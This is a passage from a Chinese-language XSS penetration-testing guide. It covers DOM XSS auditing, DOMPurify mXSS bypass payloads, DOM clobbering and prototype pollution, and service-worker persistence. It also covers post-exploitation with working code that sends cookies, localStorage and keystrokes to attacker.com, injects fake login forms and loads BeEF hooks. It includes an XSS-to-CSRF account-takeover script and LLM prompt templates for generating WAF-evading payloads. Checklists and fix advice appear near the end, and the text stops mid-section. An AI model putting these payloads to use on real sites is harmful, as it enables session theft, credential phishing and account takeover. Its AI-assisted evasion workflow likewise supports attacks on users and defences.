5. **审计第三方组件库**：富文本编辑器（Quill/Tiptap）、Markdown渲染器（marked/showdown，注意XSS选项是否开启）
6. **验证**：构造对应框架语法的polyglot，在浏览器DevTools Console观察sink触发

## 六、DOM XSS深度：Source-Sink审计方法论

### 6.1 DOM XSS特点
- 服务器不可见：payload只存在于URL fragment/postMessage/window.name/storage
- WAF/输出编码/服务端过滤全部失效
- SPA路由（hash路由/history路由）放大了攻击面
- **2026年最常见XSS变体**，是审计重点

### 6.2 Source → Sink 完整数据流清单
```
URL源: location.hash → 剪枝 → 元素id匹配 → DOM操作（常见路由库漏洞模式）
postMessage源: event.data → 未校验event.origin → innerHTML/eval
storage源: localStorage.getItem() → 二次渲染（存储型DOM XSS）
网络源: fetch响应 → .json() → 动态渲染
window.name源: 跨页面持久化 → 新页面读取
```

### 6.3 DOM XSS自动化检测工具链
```bash
# Burp DOM Invader（最强DOM XSS检测）
# 设置：Proxy -> Settings -> DOM Invader -> Enable
# 功能：自动标记source/sink、postMessage劫持检测、canary注入

# Retire.js（检测老旧易受攻击JS库）
# 浏览器扩展，识别已知漏洞库版本

# Snyk / npm audit（供应链层）
npm audit --json | jq '.vulnerabilities | keys'

# 语义化搜索
rg -n "location\.|document\.referrer|postMessage|localStorage|sessionStorage|window\.name" --type js | rg "innerHTML|eval|write|href|src|location"

# 动态分析
# Puppeteer/Playwright + 自写sink探针（注入canary，监听sink调用栈）
```

### 6.4 手动审计五步法
1. **枚举source**：全站搜`location.*`/`document.URL`/`referrer`/`postMessage`/`window.name`/`storage`
2. **枚举sink**：全站搜`innerHTML`/`eval`/`document.write`/`setAttribute`/`href=`/`location=`
3. **建立数据流**：source到sink之间是否经过编码/校验（白名单/replace/正则）
4. **测试绕过**：对编码/校验点构造绕过（双编码、Unicode、突变、原型污染）
5. **验证触发**：DevTools中修改location.hash/postMessage模拟，Console看执行

## 七、mXSS深度：DOMPurify历史绕过全谱系

### 7.1 mXSS原理
mXSS（突变XSS）发生在**序列化→再解析**环节：消毒器检查的是第一次解析的DOM树，而浏览器对消毒后字符串再次解析时产生不同的树（突变），复活被"清除"的危险节点。DOMPurify官方总结的核心规则：
- **消毒输出是上下文绑定的**：`sanitize()`的输出只在"innerHTML插入"这一约定上下文安全；用于`script.text`/`setAttribute('title')`/`svgElement.innerHTML`/模板引擎二次渲染都会打破安全契约
- **字符串比对是弱测试**：`clean.includes('onerror')`检测不到解析器突变
- **正确测试**：消毒→序列化→再解析→检查活动节点（`container.querySelector('[onerror]')`）

### 7.2 mXSS攻击类总览（DOMPurify Attack Classes）
| 攻击类 | 原理 | 代表CVE |
|--------|------|---------|
| 命名空间混淆 | HTML/SVG/MathML解析规则不同，跨命名空间边界复活 | 2.0.17 MathML bypass |
| Rawtext Breakout | style/script/textarea等rawtext元素内闭合逃逸 | 2.0.7-2.0.17系列 |
| 深度限制平坦化 | 深层嵌套触发解析器repair机制压平DOM | CVE-2024-47875 |
| 嵌套mXSS+原型污染 | 特殊嵌套绕过深度检查+PP削弱消毒器 | CVE-2024-45801 |
| 模板表达式重组 | 消毒后字符串再拼接进模板时重组 | 通用类 |
| 引擎延迟DOM突变 | 消毒引擎与最终浏览器引擎解析差异 | 跨引擎类 |
| Re-contextualization | 消毒输出被拼入特殊包装器再解析（二次解析上下文切换） | **CVE-2026-0540** |
| SVG shadow-tree | `<use>`元素引用foreignObject内script，消毒器未跨边界检查 | **CVE-2026-2449** |
| DOM clobbering | form等元素name属性覆盖消毒器内部检查属性 | **CVE-2026-49459** |
| Custom element hook绕过 | 自定义元素允许列表下afterSanitizeElements钩子不执行 | **CVE-2026-66010** |

### 7.3 DOMPurify历史绕过Payload谱系（含2026最新）
```html
<!-- 经典命名空间混淆（2.0.17） -->
<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">
<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>"></style><img src=1 onerror=alert(1)>">

<!-- 注释突变（Gareth Heyes, PortSwigger） -->
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>

<!-- 深度限制平坦化类（CVE-2024-47875形态） -->
<svg></p><style><a id="</style><img src=x onerror=alert(1)>"></svg>

<!-- Re-contextualization（CVE-2026-0540，3.1.3-3.3.1）
     应用把sanitize输出拼进 <xmp>/<script>/<iframe>/<noembed>/<noframes>/<noscript> 包装器再innerHTML -->
<img src=x alt="</xmp><img src=x onerror=alert('xss')>">

<!-- SVG use shadow-tree（CVE-2026-2449，3.2.5）
     消毒器信任foreignObject内已检查子树，use引用阴影实例复活script -->
<svg>
 <use href="#x"/>
 <foreignObject>
  <svg id="x">
   <script>alert(document.domain)</script>
  </svg>
 </foreignObject>
</svg>

<!-- DOM clobbering + IN_PLACE（CVE-2026-49459，<3.4.6）
     form内子元素name覆盖_isClobbered检查属性，事件属性被保留 -->
<form onfocus=alert(1)><input name=attributes><input name=nodeName></form>
```
**注意**：以上均为历史绕过，当前最新DOMPurify版本已修复。实战价值在于：
1. 测试应用是否固定了旧版本DOMPurify（检查lockfile版本号）
2. 理解攻击类以构建新绕过
3. 审计应用的"二次解析"模式（sanitize输出被拼接/再解析的位置）

### 7.4 消毒器绕过审计要点（防御者视角测试）
- 检查`DOMPurify.sanitize()`调用点：返回值是否被拼接到字符串/模板/URL/srcdoc中二次解析
- 检查`ALLOWED_TAGS`/`ALLOWED_ATTR`自定义配置是否放宽（`FORBID_TAGS`配置遗漏）
- 检查`IN_PLACE: true`模式调用（CVE-2026-49459攻击面）
- 检查`CUSTOM_ELEMENT_HANDLING`自定义元素配置（CVE-2026-66010攻击面）
- 检查服务端消毒（jsdom）与客户端渲染引擎差异（引擎延迟突变）

## 八、DOM Clobbering与原型污染链式XSS

### 8.1 DOM Clobbering基础
利用HTML元素的`id`/`name`属性创建全局变量或覆盖DOM属性，劫持应用逻辑：
```html
<!-- id/name创建全局变量 -->
<form id=x></form>
<script>alert(x.constructor.constructor('alert(1)')())</script>

<!-- 覆盖document属性：经典Bootstrap 3 XSS（CVE-2025-1647） -->
<a id="close"></a><a name="defaultPrevented"></a>
<!-- 库代码读取element.defaultPrevented被污染 -->

<!-- clobber window属性 -->
<img name="x"> <script>window.x.outerHTML // 被覆盖</script>

<!-- 覆盖表单属性 -->
<form name="attributes"></form>  <!-- 污染attributes遍历 -->

<!-- clobber localStorage（老技巧） -->
<a id=localStorage></a>
```
**测试姿势**：注入`<a id=xxx>`/`<form name=xxx>`后在Console检查`window.xxx`是否被劫持，然后寻找库代码/应用代码读取该属性并进入sink。

### 8.2 原型污染→XSS
**原理**：通过`__proto__`/`constructor.prototype`污染`Object.prototype`，让后续对象读取到攻击者注入的属性值，改变库或应用预期行为：
```javascript
// 经典污染payload（JSON场景）
{"__proto__":{"polluted":"yes"}}
{"constructor":{"prototype":{"polluted":"yes"}}}
// 合并逻辑（深拷贝/merge/assign）缺陷是入口：
// Object.assign / lodash merge / jQuery.extend(true) / 各种deepMerge实现

// 污染后触发sink示例：库代码若执行
// el.innerHTML = options.template → 被污染的Object.prototype.template被读取
{"__proto__":{"template":"<img src=x onerror=alert(1)>"}}

// 配合前端框架
// Vue/React状态对象合并时的原型污染 → 组件渲染读取污染属性
```
**实战链**：
```
1. 找到JSON解析+深合并点（配置合并、query参数merge、localStorage恢复）
2. 注入 __proto__ 污染 Object.prototype 的特定属性
3. 找到读取该属性并写入sink（innerHTML/模板）的代码路径
4. 触发XSS
```
**已知案例**：jQuery <3.5原型污染（CVE-2019-11358）、DOMPurify CVE-2024-45801（原型污染削弱深度检查）、大量npm库deepMerge漏洞。

### 8.3 链式利用组合
- **原型污染 + mXSS**：CVE-2024-45801组合攻击（PP削弱深度检查→嵌套mXSS绕过）
- **DOM Clobbering + DOMPurify**：CVE-2026-49459组合攻击
- **Clobbering + CSP绕过**：覆盖库内部信任检查属性，诱导库执行gadget链
- **测试工具**：`clobbering` payload生成（https://github.com/yesmeck/jquery-xss-tests 参考）

## 九、Service Worker/Web Worker持久化与浏览器漏洞利用面

### 9.1 Service Worker持久化XSS
**核心价值**：SW注册后独立于页面生命周期运行，可拦截/篡改同源全部请求，实现跨页面持久化控制：
```javascript
// 场景1：XSS点内注册恶意SW（需SW脚本在同源或CSP允许的源）
navigator.serviceWorker.register('/sw.js');

// 恶意sw.js示例：拦截并篡改所有响应
self.addEventListener('fetch', (event) => {
  event.respondWith(
    fetch(event.request).then((res) => {
      // 篡改HTML响应注入payload
      return new Response(res.body.pipeThrough(transformStream), {headers: res.headers});
    })
  );
});

// 场景2：SW被劫持（Scope接管）
// 若注册代码用动态字符串构造URL，注入 "/" 扩大scope
navigator.serviceWorker.register('/api/user/' + userInput + '/sw.js');
// 路径穿越注入 → 注册到更高scope（如根目录）→ 劫持全站

// 场景3：importScripts注入
// sw.js内若importScripts(动态值)，可注入外部恶意脚本
self.importScripts('https://attacker.com/evil.js');
```
**审计点**：搜`serviceWorker.register`、检查SW脚本内`importScripts`/动态URL、检查SW scope是否可被用户输入影响。

### 9.2 Web Worker绕过CSP
```javascript
// Worker从其他源加载脚本，绕过页面CSP对主线程的限制
var w = new Worker('http://attacker.com/worker.js');
// worker.js: importScripts('http://attacker.com/x.js');

// Blob Worker
var b = new Blob(['importScripts("http://attacker.com/x.js")'],{type:'application/javascript'});
var u = URL.createObjectURL(b);
new Worker(u);

// SharedWorker / DedicatedWorker 数据传递
worker.postMessage(data) // 若worker内部把data写入innerHTML/eval → DOM XSS
```

### 9.3 浏览器漏洞利用面（0-click XSS / uXSS）
**Universal XSS（uXSS）**：跨源脚本执行，浏览器/扩展/协议处理器漏洞触发，通常0-click：
- **浏览器内核漏洞**：CVE-2021-1765（Chrome）、各类渲染器RCE前置
- **协议处理器滥用**：`mailto:`/`tel:`/自定义协议处理器的URL注入
- **PDF/Office内嵌HTML**：PDF打开时的JavaScript执行（老版本Adobe/Acrobat）
- **浏览器扩展漏洞**：恶意扩展或脆弱扩展的content script XSS
- **PWA/manifest**：manifest.json的`scope`/`start_url`恶意配置，web app安装劫持

**0-click XSS触发面（无需用户交互）：**
```javascript
// 自动加载触发（无需点击）
<img src=x onerror=...>
<svg onload=...>
<iframe src="javascript:...">  // 自动加载
// 页面生命周期事件
<body onload> / <link onload> / <script onload> / <style onload>
// CSS外部资源onload（部分浏览器）
```

**利用注意事项**：浏览器漏洞利用（0-day/n-day）属高危操作，仅在获得明确授权的高价值目标（如红队任务）中使用，且需搭建隔离环境验证。

## 十、高级利用与后渗透（Cookie窃取/键盘记录/钓鱼/BeEF联动）

### 10.1 Cookie窃取与会话劫持
```javascript
// 基础Cookie窃取
<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>
<script>fetch('http://attacker.com/steal',{method:'POST',body:document.cookie})</script>

// 绕过HttpOnly（无法直接读取HttpOnly Cookie，但可执行操作）
// 通过XSS执行CSRF、读取页面内容、操作页面

// 窃取localStorage/sessionStorage
<script>fetch('http://attacker.com/steal',{method:'POST',body:JSON.stringify(localStorage)})</script>

// 窃取CSRF token（从页面表单/meta标签）
document.querySelector('meta[name="csrf-token"]').content
```

### 10.2 键盘记录
```javascript
<script>
document.onkeypress = function(e) {
    new Image().src = 'http://attacker.com/k?k=' + e.key + '&d=' + location.host;
}
</script>
// 进阶：配合focus监听记录密码框输入 + 提交前拦截
```

### 10.3 钓鱼/凭据窃取
```javascript
// 注入伪造登录表单（同源可信环境）
<script>
document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999"><h1>登录过期</h1><form action=http://attacker.com/phish method=post>用户名:<input name=u><br>密码:<input name=p type=password><br><button>登录</button></form></div>';
</script>
// 进阶：iframe内嵌攻击者页面诱导交互
// 进阶：篡改支付/转账请求（fetch拦截器，改金额/收款方）
```

### 10.4 Blind XSS（无回显XSS）
使用Blind XSS payload探测后台/日志/工单/客服页面：
```javascript
// 通用Blind XSS payload
"><script src=//attacker.com/xss.js></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'//attacker.com/xss.js\';document.body.appendChild(a)')
<img src=x onerror="s=document.createElement('script');s.src='//attacker.com/xss.js';document.body.appendChild(s)">
// xss.js内容：捕获document.cookie/页面源码/键盘输入 → 回传xss.ht平台
new Image().src='https://attacker.xss.ht/?c='+btoa(document.cookie)+'&u='+location.href;
```
**Blind XSS平台配合（与AI自动化配合见第十二章）：**
- XSS Hunter Express: https://github.com/mandatoryprogrammer/xsshunter-express
- ezXSS: https://github.com/ssl/ezXSS
- 自建接收端：`https://attacker.xss.ht` 记录所有回连，标记触发页面与上下文

### 10.5 PostMessage XSS
```javascript
// 不安全的postMessage监听
window.addEventListener('message', function(e) {
    eval(e.data);  // 危险：直接eval消息内容
}, false);

// 利用：在任意站点发送恶意消息（需确认目标handler是否校验origin）
<iframe src="https://target.com" onload="this.contentWindow.postMessage('alert(1)','*')">

// 实战审计：搜索addEventListener('message'，检查event.origin是否白名单校验
// payload思路：绕过origin校验（用子域名/兄弟域名/解析差异绕过宽松白名单）
```

### 10.6 Web Worker绕过CSP
```javascript
// Worker可绕过页面CSP，从其他源加载脚本
var w = new Worker('http://attacker.com/worker.js');
// worker.js: importScripts('http://attacker.com/x.js');

// 或Blob Worker
var b = new Blob(['importScripts("http://attacker.com/x.js")'],{type:'application/javascript'});
var u = URL.createObjectURL(b);
new Worker(u);
```

### 10.7 BeEF浏览器后渗透（C2化XSS）
```html
<!-- BeEF hook脚本（将XSS升级为C2通道） -->
<script src=http://attacker.com:3000/hook.js></script>
```
**BeEF实战流程：**
```
1. 启动：beef-xss（默认端口3000，UI: http://127.0.0.1:3000/ui/panel）
2. 交付hook：注入XSS点或钓鱼邮件/水坑页面
3. 浏览器指纹：OS/浏览器版本/分辨率/已装插件
4. 信息收集模块：Cookie获取、页面抓取、表单值捕获、剪贴板监听
5. 网络侦察：内网IP探测、端口扫描、子域名探测（借受害者浏览器）
6. 社工模块：假更新弹窗、HTML5钓鱼、权限请求
7. 持久化：iframe隧道、持久化hook（重新加载后重连）
8. Metasploit联动：browser_autopwn 针对受害者浏览器版本推送exploit
   msf> use exploit/multi/browser/browser_autopwn
```
**BeEF + Metasploit browser_autopwn链**：XSS hook → 指纹识别浏览器版本 → 匹配Metasploit浏览器漏洞模块 → RCE（2026年主流浏览器漏洞利用n-day仍频繁，Chrome/Edge/Firefox历史CVE：CVE-2021-1765等）。
**审计视角**：hook.js即"反弹shell"，一旦BeEF能hook即证明XSS可完全控制浏览器会话，报告评级应直接拉高。

### 10.8 浏览器劫持/BeEF框架
```html
<!-- BeEF hook脚本 -->
<script src=http://attacker.com:3000/hook.js></script>
<!-- BeEF功能：浏览器信息收集、内网扫描、端口扫描、键盘记录、钓鱼、社工、Metasploit模块联动 -->
```

## 十一、XSS→CSRF→账户接管（ATO）完整攻击链

### 11.1 为什么XSS必须链式利用
MSRC（微软安全响应中心）2025年11月专题《Weaponizing XSS》指出：**单个XSS"弹窗"只是POC，真正的危害在于组合链**。现代站点普遍启用HttpOnly+SameSite Cookie，单纯窃取Cookie的路径已收窄，攻击者转向：
- **XSS + CSRF**：在已认证会话中静默执行状态变更请求
- **XSS + 弱会话保护**：会话Cookie未HttpOnly/Secure时才可窃取
- **XSS + 日志注入**：JSON日志编码与HTML日志查看器上下文错配
- **XSS + 文件上传**：SVG XSS + 路径穿越 → 服务端RCE
- **XSS + SSRF**：借受害者浏览器访问内网服务/外带内网文件

### 11.2 攻击链模板：XSS → CSRF → ATO
```
阶段1 XSS立足：在可持久化位置（资料/评论/文件名）植入BeEF hook或自动payload
阶段2 等待高权限受害者访问：存储型XSS天然具备"钓鱼等待"特性
阶段3 静默CSRF（自动化，无需用户交互）：
   - 读取CSRF token（若token在页面/meta/cookie中）
   - 用fetch/XHR带凭据发起敏感操作：改邮箱/改密码/加管理员/提权
阶段4 账号接管完成：攻击者获得受害者账号完全控制权
阶段5 横向：管理员账号 → 后台功能滥用 → RCE（上传webshell/主题注入）
```

### 11.3 完整CSRF自动化payload（改邮箱→接管）
```javascript
// 目标场景：账号设置页存在"修改绑定邮箱"接口（无CSRF防护或token可获取）
<script>
(async () => {
  // 1. 从页面/meta读取CSRF token（若存在）
  const token = document.querySelector('meta[name="csrf-token"]')?.content
              || document.querySelector('input[name="csrf"]')?.value || '';
  // 2. 发起修改邮箱请求
  const res = await fetch('/account/email', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json', 'X-CSRF-Token': token},
    body: JSON.stringify({email: 'attacker@evil.com'})
  });
  // 3. 回传结果（证明链式利用成功）
  new Image().src = 'https://attacker.com/chain?ok=' + (res.ok ? 1 : 0);
})();
</script>
```
**SameSite=Lax绕过思路**（现代站点常见配置）：
- Lax允许顶级导航GET请求携带Cookie → 利用GET型状态变更接口或`<a>`/`location`触发
- 跨站iframe内POST默认不带Cookie，但可先`window.open`导航到同源再执行
- 利用CORS配置缺陷：若同源API允许`Access-Control-Allow-Origin: *` + 无凭据，可完全脱离XSS独立执行CSRF

### 11.4 日志XSS → 管理员ATO（MSRC实战技术）
**技术背景**：JSON序列化库将`<`/`>`转义为`\u003c`/`\u003e`（看起来安全），但日志查看器用HTML渲染时解码还原，导致XSS在管理员浏览器执行：
```json
// 在日志字段注入（JSON Unicode转义形式）
{"event": "\u003cimg src=x onerror=\"fetch('https://attacker.com/?c='+document.cookie)\"\u003e"}
```
**审计点**：搜`\u003c`/JSON.stringify的输出进入`innerHTML`渲染的日志/监控/审计页面；`<script type="application/json">`内嵌数据的HTML转义与JS解析上下文错配。

### 11.5 XSS + 文件上传 → RCE
```
1. 发现SVG/HTML文件上传点（头像/签名/附件预览）
2. 上传恶意SVG：<svg xmlns="http://www.w3.org/2000/svg"><script>...</script></svg>
3. 管理后台预览/下载时触发XSS（借管理员会话）
4. 借管理员会话利用文件上传/路径穿越漏洞写入webshell
5. 服务端RCE
```
**测试要点**：文件名XSS（`"><img src=x onerror=alert(1)>.png`）、文件内容XSS（SVG/HTML）、文件类型混淆（`text/html`内容改`.jpg`扩展名+Content-Type嗅探）。

### 11.6 Self-XSS 升级链（实战案例：Akamai WAF绕过→CSRF→ATO）
```
1. 发现Self-XSS点（仅自己能触发，如个人偏好设置回显）
2. WAF绕过：修改请求格式（JSON vs 表单）触发403与200的差异 → 找到WAF不拦截的编码形态
3. 注入存储型payload（绕WAF后在偏好字段持久化）
4. CSRF链：利用登录态Cookie机制（cookie与header token匹配检查）构造跨站请求
5. 其他用户访问时触发 → 批量账户接管
```
**要点**：Self-XSS不因"影响自己"而低危——任何存储型传播面都会升级为实际危害。

## 十二、AI大模型结合XSS攻防（2025-2026前沿）

### 12.1 AI生成多态payload：让签名WAF失效
**研究实证**：
- **GenXSS框架（arXiv:2504.08176）**：GPT-4o上下文学习生成264个payload，83%语法有效，**80%绕过ModSecurity+OWASP CRS**；仅15条新规则即拦截86%此前成功的绕过
- **XSSGAI（2025年3月开源）**：seq2seq神经网络+14437条HackerOne/PortSwigger真实攻击样本训练，payload语法正确率88%，温度采样控制变异强度
- **Xbow AI**：HackerOne全球排名第一的AI黑客，自动发现0day（1000+）并自动生成绕过payload

**AI生成payload工作流：**
```
1. 输入上下文描述：注入位置、过滤规则、WAF类型（如"img标签src属性，过滤onerror，Cloudflare WAF"）
2. LLM生成N个变体：要求不同编码组合/事件类型/嵌套结构
3. 本地验证器批量验证（Node+jsdom模拟解析，或headless Chrome）
4. 筛选有效payload → 对目标发送
5. 失败反馈循环：把403/过滤响应特征回传LLM → 迭代下一轮
```

**LLM生成polyglot提示词模板：**
```
你是资深XSS研究员。生成一个同时兼容以下上下文的polyglot payload：
1. HTML属性值（双引号） 2. JavaScript字符串（单引号） 3. URL上下文
要求：绕过基于关键字（script/onerror/alert）的黑名单过滤，
不使用base64硬编码字符串，优先利用JS语法特性（模板字符串、constructor链、编码变换）。
输出3个变体并解释每个变体的解析路径。
```

### 12.2 LLM辅助前端代码审计（找注入点）
**方法论**：把"人工grep+追踪数据流"变成LLM批量审计：
```
1. 输入：项目源码（或危险API的grep结果）→ 提示LLM按source→sink建模
2. 提示词要点：
   - 列出所有Source（用户可控输入）与所有Sink（危险DOM操作）
   - 对每个source→sink路径判断是否有净化/编码（白名单/转义/消毒器）
   - 标记净化可绕过点（双编码/突变/原型污染可影响的对象）
3. 输出：可疑点列表（文件:行号 + 数据流描述 + 建议payload形态）
4. 人工复核：LLM可能误报/漏报，必须人工验证再测试
```
**效率提升**：LLM对5万行前端代码的sink枚举比人工快10倍以上，且能发现跨文件数据流（状态管理→组件渲染）。

### 12.3 AI驱动Blind XSS自动化（配合XSS Hunter）
**完整闭环：**
```
1. 部署XSS Hunter Express平台（attacker.xss.ht）
2. AI遍历目标站点：爬虫+参数枚举（可接dalfox/xsstrike半自动）
3. 每个输入点自动注入带唯一标识的Blind payload：
   <script src=https://attacker.xss.ht/uid-{N}></script>
   <img src=x onerror="fetch('https://attacker.xss.ht/u/{N}')">
4. XSS Hunter收到回连 → 记录触发URL/页面/上下文
5. AI汇总：按触发环境（后台/前台）分类，生成利用链建议
6. 对未触发点迭代：AI分析响应差异生成新payload再测
```
**AI在盲打中的独特价值**：
- 生成带正确Content-Type/编码形态的payload（适配json/xml/form上下文）
- 自动生成"低噪声"payload（避免触发告警的明显特征）
- 根据XSS Hunter返回的页面指纹自动切换payload家族

### 12.4 AI辅助编码变体穷举（WAF绕过自动化）
```
提示词：对payload "<img src=x onerror=alert(1)>" 生成50个编码变体，
覆盖：HTML实体(hex/dec)、Unicode转义、URL编码、八进制、混合编码、
大小写变体、空白字符插入（Tab/换行/注释）、全角字符、双重编码，
并按"WAF特征最少"排序。
```
**注意**：AI生成的payload仍需在受控环境验证（jsdom/headless），避免直接对目标产生破坏性影响；AI可能产生看似合理但无效的payload，验证环节不可省略。

### 12.5 AI攻防对抗启示
- **攻**：AI把WAF绕过从"专家手艺"变成"算力穷举"，多态payload无限生成
- **防**：签名WAF过时，转向：上下文感知输出编码、Trusted Types、CSP nonce/hash、AI驱动的WAF规则自动生成（GenXSS同时展示了15条新规则拦截86%绕过）
- **合规**：AI生成攻击代码必须坚守授权边界，禁止对未授权目标使用自动化盲打

## 十三、工具链

### 13.1 扫描与检测工具
| 工具 | 用途 | 备注 |
|------|------|------|
| Burp Suite Pro | 主动扫描+手动验证 | Active Scan含XSS审计 |
| Burp DOM Invader | DOM XSS检测 | 自动标记source/sink、postMessage劫持、canary注入 |
| Burp Hackvertor | 编码标签化构造 | 见第三章编码矩阵 |
| Dalfox | 快速XSS扫描器 | 参数分析+WAF绕过+Blind XSS |
| XSStrike | XSS扫描+WAF绕过引擎 | Python，探测+payload生成 |
| wfuzz / ffuf | Fuzz XSS payload与参数 | 配合自建字典 |
| Retire.js | 老旧易受攻击JS库检测 | 浏览器扩展 |
| nuclei | 模板化漏洞扫描 | XSS模板丰富 |
| ZAP | 开源DAST | 社区方案 |

### 13.2 Blind XSS平台
- XSS Hunter Express: https://github.com/mandatoryprogrammer/xsshunter-express（自托管，支持多上下文payload）
- ezXSS: https://github.com/ssl/ezXSS
- 商业：Intigriti / HackerOne 自带XSS回连监控
- 自建：VPS + 简单HTTP接收端记录`?c=`参数

### 13.3 编码与Payload生成
- Hackvertor（Burp扩展）：嵌套编码标签
- PayloadsAllTheThings / SecLists XSS字典
- **XSSGAI**（AI生成器）: https://github.com/AnonKryptiQuz/XSSGAI
- **GenXSS**（LLM框架）: https://arxiv.org/abs/2504.08176
- 在线验证：https://jsfiddle.net / local jsdom + headless Chrome 批量验证
- clobbering/原型污染payload参考：https://github.com/yesmeck/jquery-xss-tests

### 13.4 CSP分析工具
- https://csp-evaluator.withgoogle.com/（Google官方策略评估）
- https://cspbypass.com/
- Burp CSP Auditor
- 浏览器DevTools：Network响应头直接审查CSP

### 13.5 后渗透与C2
- BeEF: `beef-xss`（hook.js即浏览器C2）
- Metasploit: `browser_autopwn`（浏览器漏洞利用）
- Social-Engineer Toolkit（钓鱼配合）
- Interactsh（DNS/HTTP外带回连，配合Blind XSS验证）

### 13.6 Dalfox高级用法
```bash
# 基础扫描
dalfox url "http://target.com/page?q=test"

# 深度扫描+Blind XSS
dalfox url "http://target/page?q=test" --blind https://attacker.xss.ht --remote-payloads portswigger,payloadbox

# POST请求扫描
dalfox url "http://target/login" -X POST -d "username=test&password=test"

# 自定义Payload + WAF绕过 + 无头检测
dalfox url "http://target/page?q=test" --custom-payload payloads.txt --waf-evasion --headless

# 忽略证书+代理+多参数
dalfox url "http://target/page" --proxy http://127.0.0.1:8080 --follow-redirects -F
```

### 13.7 XSStrike使用
```bash
# 基础扫描 / POST扫描 / 爬行+扫描 / 盲打XSS
python xsstrike.py -u "http://target.com/page?q=test"
python xsstrike.py -u "http://target/page" --data "q=test"
python xsstrike.py -u "http://target.com" --crawl
python xsstrike.py -u "http://target/page?q=test" --blind
```

## 十四、XSS测试检查清单

### 14.1 信息收集与攻击面枚举
- [ ] 枚举全部输入点：URL参数/POST body/JSON字段/Header/Cookie/Path/Hash/文件名/上传文件内容
- [ ] 识别技术栈：框架（React/Vue/Angular/Svelte/AngularJS）、库版本（jQuery/DOMPurify/Bootstrap）、SSR模式
- [ ] 识别全部上下文类型：HTML/属性/JS/URL/CSS/Markdown/SVG/JSON
- [ ] 检查CSP策略头（script-src/base-uri/object-src/trusted-types）
- [ ] 检查Trusted Types是否启用及策略配置
- [ ] 检查HttpOnly/Secure/SameSite Cookie属性
- [ ] 枚举同源JSONP端点与script-src白名单域名

### 14.2 注入测试
- [ ] 基础Payload测试（script/img/svg/body/iframe）
- [ ] 事件处理程序枚举（onerror/onload/onfocus/ontoggle/onanimationstart等）
- [ ] 大小写/编码/注释/空白符/斜杠/全角字符绕过
- [ ] 20+上下文逐一构造对应闭合payload
- [ ] Polyglot通用payload测试
- [ ] Markdown/富文本编辑器注入
- [ ] 文件上传回显XSS（文件名/SVG内容/HTML内容）
- [ ] JSON字段XSS与Content-Type变换测试
- [ ] URL Path与Hash片段DOM XSS测试
- [ ] Referer/UA/XFF等头注入测试
- [ ] WAF绕过（Hackvertor编码矩阵、HPP、Chunked、Content-Type混淆）
- [ ] AI生成多态payload变体测试（XSSGAI/LLM）

### 14.3 框架与DOM专项
- [ ] grep危险Sink：dangerouslySetInnerHTML/v-html/{@html}/bypassSecurityTrust/innerHTML/eval
- [ ] source→sink数据流追踪（hash/postMessage/storage/URL）
- [ ] postMessage监听器origin校验审计
- [ ] AngularJS沙箱逃逸（{{}}表达式）
- [ ] CSTI客户端模板注入检测（{{7*7}}等）
- [ ] DOM Clobbering测试（id/name属性劫持）
- [ ] 原型污染测试（__proto__/constructor.prototype）
- [ ] SSR/Hydration JSON序列化注入（</script>逃逸）

### 14.4 高级绕过与利用
- [ ] CSP绕过：unsafe-inline/unsafe-eval/strict-dynamic/data:/JSONP端点
- [ ] Script Gadget链（jQuery data-*、Angular表达式、框架库gadget）
- [ ] Trusted Types绕过（宽松策略/策略名碰撞/DOM clobbering）
- [ ] mXSS测试（命名空间混淆/rawtext breakout/深度嵌套/二次解析包装器）
- [ ] DOMPurify版本审计（<3.4.x是否存在已知绕过）
- [ ] Service Worker/Web Worker注册与劫持测试
- [ ] Blind XSS（后台/日志/工单/客服系统）
- [ ] Cookie窃取/BeEF hook验证
- [ ] XSS→CSRF→ATO链验证（改邮箱/加管理员等敏感操作）
- [ ] 日志XSS→管理员ATO链（JSON编码错配）

### 14.5 验证与收尾
- [ ] 多浏览器验证（Chrome/Firefox/Safari/Edge解析差异）
- [ ] 记录触发条件与上下文（截图/请求/响应）
- [ ] 存储型XSS测试后清理注入数据
- [ ] 测试痕迹清理（临时文件/WebShell/注入内容）
- [ ] 输出漏洞报告：影响面/利用链/复现步骤/修复建议

## 十五、修复建议

### 15.1 输出编码（核心修复，按上下文）
| 上下文 | 编码方式 | 示例 |
|-------|---------|------|
| HTML标签之间 | HTML实体编码 | `&lt;&gt;&amp;&quot;&#x27;` |
| HTML属性值 | 属性编码+引号转义 | `&quot;` + 引号实体 |
| JavaScript上下文 | JS字符串转义（`\x`/`\u`） | 绝不可只做HTML编码 |
| URL上下文 | URL编码+协议白名单 | 仅允许http/https/mailto/# |
| CSS上下文 | CSS转义+禁用url(javascript:) | CSS上下文XSS极少见但危险 |

**正确姿势**：优先使用框架的上下文感知编码（React JSX/Vue插值默认已编码），手动拼接场景用OWASP ESAPI/encodeURIComponent等专用库。

### 15.2 CSP配置（严格基线）
```http
# 无内联、无eval、nonce/hash白名单
Content-Security-Policy: default-src 'none'; script-src 'nonce-随机值'; 
  style-src 'self'; img-src 'self' data:; base-uri 'none'; 
  object-src 'none'; frame-ancestors 'none'; form-action 'self';
# 配合Trusted Types
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types 策略名;
```
- **必须配置**：`base-uri 'none'`（防劫持相对路径）、`object-src 'none'`（防插件XSS）
- **禁止**：`'unsafe-inline'`/`'unsafe-eval'`/`data:` script、裸通配符`*`
- **strict-dynamic需审计gadget**：即使strict-dynamic也有13/16框架被gadget绕过
- **nonce不落地DOM**：nonce不能出现在HTML属性中可被读取的位置（DOM XSS可读nonce）

### 15.3 Trusted Types部署
```javascript
// 启用后所有危险sink强制Trusted对象
if (window.trustedTypes && trustedTypes.createPolicy) {
  const policy = trustedTypes.createPolicy('app', {
    createHTML: (s) => DOMPurify.sanitize(s),
    createScriptURL: (u) => (new URL(u, location.origin).origin === location.origin ? u : 'about:blank')
  });
}
// 上报违规而非直接拦截（灰度）
// 通过report-to/报告端点收集TT违规，逐步收敛
```
**注意**：策略实现本身必须安全（createHTML内必须消毒，createScriptURL必须校验来源），否则等于自挖绕过口（MutantBedrog类攻击即滥用宽松策略）。

### 15.4 消毒器使用规范
